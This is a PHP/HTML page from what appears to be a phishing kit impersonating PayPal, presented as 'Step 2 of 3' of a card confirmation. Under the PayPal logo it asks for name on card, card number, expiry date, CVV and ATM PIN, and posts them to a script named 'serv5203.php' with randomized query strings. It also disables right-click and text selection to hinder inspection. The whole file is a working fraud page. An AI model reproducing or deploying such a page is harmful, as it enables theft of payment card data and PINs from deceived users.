<?php 
ob_start();
session_start();
?>
    <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Confirm your card information</title>
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../css/normalize.css" />
            <link rel="stylesheet" href="../css/bootstrap.min.css" />
            <link rel="stylesheet" href="../css/font-awesome.min.css" />
            <link rel="stylesheet" href="../css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico">
            <script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
        </head>
        <body>
            <div class="lod-full" style="display: none;">
                <div class="lod-c"></div>
            </div>
            <div class="contain">
                <div class="img-logo">
                    <a href="#"><img src="../img/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="#" class="log_out">Log Out</a></div>
                <div class="cls"></div>
            </div>
            <div class="contain biling-p">
                <form method="POST" action="<?php echo 'serv5203.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()); ?>" class="contain-info" id="card_form">
                    <center>
                        <span class="step"> (Step 2 of 3)</span>
                        <h3>Confirm Credit/Debit Card</h3>
                        <center style="margin-bottom:20px;">
                        	<img src="../img/vsa.png">
                        	<img src="../img/mc.png">
                        	<img src="../img/dcl1.png">
                        	<img src="../img/dc.png">
                        	<img src="../img/amx.png">
                        </center>
                        <input type="text" name="n_card" class="bill_input" placeholder="Name on card" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <div style="position: relative;" class="containvis">
                        	<input type="text" id="cart_number" name="c_num" maxlength="20" class="bill_input" placeholder="Card Number" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        	<img id="type_v" src="../img/vsa.png" style="display: none">
                        </div>
                        <select name="exm" class="bill_input select-v" required="required">
                        	<option value="">Expire Month</option>
                        	<option value="01">01</option>
							<option value="02">02</option>
							<option value="03">03</option>
							<option value="04">04</option>
							<option value="05">05</option>
							<option value="06">06</option>
							<option value="07">07</option>
							<option value="08">08</option>
							<option value="09">09</option>
							<option value="10">10</option>
							<option value="11">11</option>
							<option value="12">12</option>
                        </select>
                        <select name="exy" class="bill_input select-v" required="required">
                        	<option value="">Expire Year</option>
							<option value="2017">2017</option>
							<option value="2018">2018</option>
							<option value="2019">2019</option>
							<option value="2020">2020</option>
							<option value="2021">2021</option>
							<option value="2022">2022</option>
							<option value="2023">2023</option>
							<option value="2024">2024</option>
							<option value="2025">2025</option>
							<option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                        </select>
                        <div class="cls"></div>
                        <input type="text" name="csc" class="bill_input" maxlength="4" placeholder="CSC/CVV" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <input type="text" name="pin" class="bill_input" maxlength="4" placeholder="ATM PIN" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
                        <hr class="hr" style="margin:15px auto 0">
                        	<div class="bill_input bill-in">
                        		<p>Billing Information :</p>
                        		<p><?php echo $_SESSION['street']; ?></p>
                        		<p><?php echo $_SESSION['city'] .' , '.$_SESSION["state"] .'  '. $_SESSION["ZIP"]; ?></p>
                        		<p><?php echo $_SESSION['country']; ?></p>
                        	</div>
                        <hr class="hr" style="margin:0px auto 15px">
                        <input type="submit" value="Continue" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
            <div class="foot-pay">
                <center>
                    <a href="#">Contact Us</a>
                    <a href="#">Privacy</a>
                    <a href="#">Legal</a>
                    <a href="#">Worldwide</a>                
                </center>            
            </div>
            <script src="../js/jquery-1.11.3.min.js"></script>
            <script src="../js/bootstrap.min.js"></script>
            <script src="../js/cont.js"></script>
            <script src="../js/jquery.maskedinput.js"></script>
            <script src="../js/plugins.js"></script>
        </body>
    </html>
<?php
?>